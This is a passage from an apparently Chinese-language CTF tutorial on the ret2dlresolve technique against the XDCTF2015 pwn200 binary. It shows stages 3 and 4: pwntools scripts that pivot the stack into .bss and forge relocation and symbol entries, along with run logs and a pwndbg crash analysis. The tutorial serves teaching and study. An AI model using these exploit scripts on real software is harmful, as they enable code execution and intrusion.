</code></pre></div> <h5 id=stage-3>stage 3<a class=headerlink href=#stage-3 title="Permanent link">&para;</a></h5> <p>這一次，我們同樣控制 <code>_dl_runtime_resolve</code> 函數中的 reloc_offset 參數，不過這次控制其指向我們僞造的 write 重定位項。</p> <p>鑑於 pwntools 本身並不支持對重定位表項的信息的獲取。這裏我們手動看一下</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>readelf<span class=w> </span>-r<span class=w> </span>main_partial_relro_32

Relocation<span class=w> </span>section<span class=w> </span><span class=s1>&#39;.rel.dyn&#39;</span><span class=w> </span>at<span class=w> </span>offset<span class=w> </span>0x30c<span class=w> </span>contains<span class=w> </span><span class=m>3</span><span class=w> </span>entries:
<span class=w> </span>Offset<span class=w>     </span>Info<span class=w>    </span>Type<span class=w>            </span>Sym.Value<span class=w>  </span>Sym.<span class=w> </span>Name
08049ff4<span class=w>  </span><span class=m>00000306</span><span class=w> </span>R_386_GLOB_DAT<span class=w>    </span><span class=m>00000000</span><span class=w>   </span>__gmon_start__
08049ff8<span class=w>  </span><span class=m>00000706</span><span class=w> </span>R_386_GLOB_DAT<span class=w>    </span><span class=m>00000000</span><span class=w>   </span>stdin@GLIBC_2.0
08049ffc<span class=w>  </span><span class=m>00000806</span><span class=w> </span>R_386_GLOB_DAT<span class=w>    </span><span class=m>00000000</span><span class=w>   </span>stdout@GLIBC_2.0

Relocation<span class=w> </span>section<span class=w> </span><span class=s1>&#39;.rel.plt&#39;</span><span class=w> </span>at<span class=w> </span>offset<span class=w> </span>0x324<span class=w> </span>contains<span class=w> </span><span class=m>5</span><span class=w> </span>entries:
<span class=w> </span>Offset<span class=w>     </span>Info<span class=w>    </span>Type<span class=w>            </span>Sym.Value<span class=w>  </span>Sym.<span class=w> </span>Name
0804a00c<span class=w>  </span><span class=m>00000107</span><span class=w> </span>R_386_JUMP_SLOT<span class=w>   </span><span class=m>00000000</span><span class=w>   </span>setbuf@GLIBC_2.0
0804a010<span class=w>  </span><span class=m>00000207</span><span class=w> </span>R_386_JUMP_SLOT<span class=w>   </span><span class=m>00000000</span><span class=w>   </span>read@GLIBC_2.0
0804a014<span class=w>  </span><span class=m>00000407</span><span class=w> </span>R_386_JUMP_SLOT<span class=w>   </span><span class=m>00000000</span><span class=w>   </span>strlen@GLIBC_2.0
0804a018<span class=w>  </span><span class=m>00000507</span><span class=w> </span>R_386_JUMP_SLOT<span class=w>   </span><span class=m>00000000</span><span class=w>   </span>__libc_start_main@GLIBC_2.0
0804a01c<span class=w>  </span><span class=m>00000607</span><span class=w> </span>R_386_JUMP_SLOT<span class=w>   </span><span class=m>00000000</span><span class=w>   </span>write@GLIBC_2.0
</code></pre></div> <p>可以看出 write 的重定表項的 r_offset=0x0804a01c，r_info=0x00000607。具體代碼如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># write &quot;/bin/sh&quot;</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>got0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.got&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

<span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rel.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=c1># make base_stage+24 ---&gt; fake reloc</span>
<span class=n>write_reloc_offset</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>24</span> <span class=o>-</span> <span class=n>rel_plt</span>
<span class=n>write_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
<span class=n>r_info</span> <span class=o>=</span> <span class=mh>0x607</span>

<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>write_reloc_offset</span><span class=p>)</span>
<span class=c1># fake ret addr of write</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span>
<span class=c1># fake write args, write(1, base_stage+80, sh)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>base_stage</span> <span class=o>+</span> <span class=mi>80</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>))</span>
<span class=c1># construct fake write relocation entry</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>write_got</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>r_info</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>這次我們在 base_stage+24 處僞造了一個 write 的重定位項，仍然輸出了對應的字符串。</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>stage3.py
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>24506</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>10</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
/bin/sh<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Got<span class=w> </span>EOF<span class=w> </span><span class=k>while</span><span class=w> </span>reading<span class=w> </span><span class=k>in</span><span class=w> </span>interactive
</code></pre></div> <h5 id=stage-4>stage 4<a class=headerlink href=#stage-4 title="Permanent link">&para;</a></h5> <p>在 stage3 中，我們控制了重定位表項，但是僞造的重定位表項的內容仍然與 write 函數原來的重定位表項一致。</p> <p>在這個階段中，我們將構造屬於我們自己的重定位表項，並且僞造該表項對應的符號。首先，我們根據 write 的重定位表項的 r_info=0x607 可以知道，write 對應的符號在符號表的下標爲 0x607&gt;&gt;8=0x6。因此，我們知道 write 對應的符號地址爲 0x0804822c。</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>readelf<span class=w> </span>-x<span class=w> </span>.dynsym<span class=w> </span>main_partial_relro_32

Hex<span class=w> </span>dump<span class=w> </span>of<span class=w> </span>section<span class=w> </span><span class=s1>&#39;.dynsym&#39;</span>:
<span class=w>  </span>0x080481cc<span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span>................
<span class=w>  </span>0x080481dc<span class=w> </span><span class=m>33000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>12000000</span><span class=w> </span><span class=m>3</span>...............
<span class=w>  </span>0x080481ec<span class=w> </span><span class=m>27000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>12000000</span><span class=w> </span><span class=err>&#39;</span>...............
<span class=w>  </span>0x080481fc<span class=w> </span>5c000000<span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>20000000</span><span class=w> </span><span class=se>\.</span>..........<span class=w> </span>...
<span class=w>  </span>0x0804820c<span class=w> </span><span class=m>20000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>12000000</span><span class=w>  </span>...............
<span class=w>  </span>0x0804821c<span class=w> </span>3a000000<span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>12000000</span><span class=w> </span>:...............
<span class=w>  </span>0x0804822c<span class=w> </span>4c000000<span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>12000000</span><span class=w> </span>L...............
<span class=w>  </span>0x0804823c<span class=w> </span>1a000000<span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>11000000</span><span class=w> </span>................
<span class=w>  </span>0x0804824c<span class=w> </span>2c000000<span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>11000000</span><span class=w> </span>,...............
<span class=w>  </span>0x0804825c<span class=w> </span>0b000000<span class=w> </span>6c860408<span class=w> </span><span class=m>04000000</span><span class=w> </span><span class=m>11001000</span><span class=w> </span>....l...........
</code></pre></div> <p>這裏給出的其實是小端模式，因此我們需要手工轉換。此外，每個符號佔用的大小爲 16 個字節。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>

<span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rel.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

<span class=c1># make a fake write symbol at base_stage + 32 + align</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>32</span>
<span class=n>align</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=p>((</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span>
                <span class=p>)</span>  <span class=c1># since the size of Elf32_Symbol is 0x10</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=n>align</span>
<span class=n>index_dynsym</span> <span class=o>=</span> <span class=p>(</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>/</span> <span class=mh>0x10</span>  <span class=c1># calculate the dynsym index of write</span>
<span class=n>fake_write_sym</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=mh>0x4c</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>])</span>

<span class=c1># make fake write relocation at base_stage+24</span>
<span class=n>index_offset</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>24</span> <span class=o>-</span> <span class=n>rel_plt</span>
<span class=n>write_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
<span class=n>r_info</span> <span class=o>=</span> <span class=p>(</span><span class=n>index_dynsym</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x7</span> <span class=c1># calculate the r_info according to the index of write</span>
<span class=n>fake_write_reloc</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>write_got</span><span class=p>,</span> <span class=n>r_info</span><span class=p>])</span>

<span class=c1># construct rop chain</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>index_offset</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span> <span class=c1># fake ret addr of write</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>base_stage</span> <span class=o>+</span> <span class=mi>80</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_reloc</span><span class=p>)</span>  <span class=c1># fake write reloc</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>align</span><span class=p>)</span>  <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_sym</span><span class=p>)</span>  <span class=c1># fake write symbol</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>直接執行後發現並不行</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>stage4.py
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>27370</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>10</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Got<span class=w> </span>EOF<span class=w> </span><span class=k>while</span><span class=w> </span>reading<span class=w> </span><span class=k>in</span><span class=w> </span>interactive
</code></pre></div> <p>發現程序已經崩潰了，通過 coredump，可以發現程序在 <code>ld-linux.so.2</code> 中崩了。</p> <div class=highlight><pre><span></span><code> ► 0xf7f77fed    mov    ebx, dword ptr [edx + 4]
   0xf7f77ff0    test   ebx, ebx
   0xf7f77ff2    mov    ebx, 0
   0xf7f77ff7    cmove  edx, ebx
   0xf7f77ffa    mov    esi, dword ptr gs:[0xc]
   0xf7f78001    test   esi, esi
   0xf7f78003    mov    ebx, 1
   0xf7f78008    jne    0xf7f78078 &lt;0xf7f78078&gt;
    ↓
   0xf7f78078    mov    dword ptr gs:[0x1c], 1
   0xf7f78083    mov    ebx, 5
   0xf7f78088    jmp    0xf7f7800a &lt;0xf7f7800a&gt;
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0x804a7dc ◂— 0x0
... ↓
02:0008│      0x804a7e4 —▸ 0xf7f90000 ◂— 0x26f34
03:000c│      0x804a7e8 —▸ 0x804826c ◂— add    byte ptr [ecx + ebp*2 + 0x62], ch
04:0010│      0x804a7ec ◂— 0x0
... ↓
07:001c│      0x804a7f8 —▸ 0x804a84c ◂— 0x4c /* &#39;L&#39; */
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► f 0 f7f77fed
   f 1        0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x804a000 r-xp     2000 0      ./main_partial_relro_32
 0x8049000  0x804b000 rw-p     2000 0      [stack]
 0x804a000  0x804b000 rw-p     1000 1000   ./main_partial_relro_32
0xf7d6b000 0xf7f40000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc.so.6
0xf7f40000 0xf7f41000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f41000 0xf7f43000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f43000 0xf7f47000 rw-p     4000 1d7000 /lib/i386-linux-gnu/libc.so.6
0xf7f67000 0xf7f69000 r-xp     2000 0      [vdso]
0xf7f69000 0xf7f90000 r-xp    27000 0      [linker]
0xf7f69000 0xf7f90000 r-xp    27000 0      /lib/ld-linux.so.2
0xf7f90000 0xf7f91000 rw-p     1000 26000  [linker]
0xf7f90000 0xf7f91000 rw-p     1000 26000  /lib/ld-linux.so.2
</code></pre></div> <p>通過逆向分析 ld-linux.so.2 </p> <div class=highlight><pre><span></span><code><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v9</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=n>v10</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>a1</span><span class=p>[</span><span class=mi>92</span><span class=p>]</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>16</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>_WORD</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=o>*</span><span class=p>((</span><span class=n>_DWORD</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>v9</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v4</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0x7FFF</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>!*</span><span class=p>((</span><span class=n>_DWORD</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>v10</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=n>v10</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>  </span><span class=p>}</span>
</code></pre></div> <p>以及源碼可以知道程序是在訪問 version 的 hash 時出錯。</p> <div class=highlight><pre><span></span><code><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
<span class=w>        </span><span class=p>{</span>
<span class=w>            </span><span class=k>const</span><span class=w> </span><span class=n>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=n>vernum</span><span class=w> </span><span class=o>=</span>
<span class=w>                </span><span class=p>(</span><span class=k>const</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>D_PTR</span><span class=p>(</span><span class=n>l</span><span class=p>,</span><span class=w> </span><span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]);</span>
<span class=w>            </span><span class=n>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span><span class=w> </span><span class=n>ndx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>vernum</span><span class=p>[</span><span class=n>ELFW</span><span class=p>(</span><span class=n>R_SYM</span><span class=p>)(</span><span class=n>reloc</span><span class=o>-&gt;</span><span class=n>r_info</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0x7fff</span><span class=p>;</span>
<span class=w>            </span><span class=n>version</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_versions</span><span class=p>[</span><span class=n>ndx</span><span class=p>];</span>
<span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>version</span><span class=o>-&gt;</span><span class=n>hash</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
<span class=w>                </span><span class=n>version</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
</code></pre></div> <p>進一步分析可以知道，因爲我們僞造了 write 函數的重定位表項，其中 reloc-&gt;r_info 被設置成了比較大的值（由於 index_dynsym 離符號表比較遠）。這時候，ndx 的值並不可預期，進而 version 的值也不可預期，因此可能出現不可預期的情況。</p> <p>通過分析 .dynmic 節，我們可以發現 vernum 的地址爲 0x80482d8。</p> <div class=highlight><pre><span></span><code>❯ readelf -d main_partial_relro_32

Dynamic section at offset 0xf0c contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
